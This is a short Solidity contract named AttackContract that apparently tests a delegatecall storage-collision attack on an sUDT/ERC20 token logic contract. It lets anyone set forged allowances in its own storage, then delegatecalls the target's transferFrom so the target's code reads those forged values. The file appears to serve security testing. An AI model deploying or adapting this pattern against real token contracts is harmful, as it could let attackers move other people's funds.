pragma solidity ^0.8.0;


contract AttackContract {
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint256 private _sudtId;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    event Log(string str, bool result);
    event Log2(string str, uint256 result);

    constructor(uint256 sudtId_) public {
        _sudtId = sudtId_;
    }
    function attack1(address logicContractAddr,address from,address to ,uint256 amount) public returns(bool) {
        bool r;
        bytes memory s;
        (r, s) = logicContractAddr.delegatecall(abi.encodeWithSignature("transferFrom(address,address,uint256)", from,to,amount));
        emit Log("delegatecall return ", r);  // r为true或false
        return r;
        /* uint256 result = bytesToUint(s); */
        /* emit Log2("return ", result); */
    }

    function setAllowance(address owner,address spender, uint256 amount) public {
        _allowances[owner][spender] = amount;
    }

    function get_allowances(address from,address to) public view returns( uint256){
        return _allowances[from][to];
    }

    function bytesToUint(bytes memory b) public pure returns (uint256){
        uint256 number;
        for(uint i= 0; i<b.length; i++){
            number = number + uint8(b[i]) * (2**(8 * (b.length-(i+1))));
        }
        return  number;
    }
}
